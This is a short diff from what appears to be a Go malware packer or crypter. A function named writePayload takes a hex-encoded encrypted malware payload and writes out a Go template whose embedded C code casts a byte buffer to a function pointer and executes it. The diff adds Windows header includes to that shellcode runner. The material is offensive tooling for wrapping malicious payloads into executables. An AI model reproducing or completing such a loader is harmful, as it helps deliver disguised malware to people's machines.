@@ -95,6 +95,9 @@ func writePayload(hexEncryptedMalware []byte, outputMalware string, encryptionPa
 	templateGoFile := fmt.Sprintf(`
 package main
 /*
+#include <windows.h>
+#include <stdio.h>
+
 call(char *code) {
     int (*ret)() = (int(*)())code;
     ret();
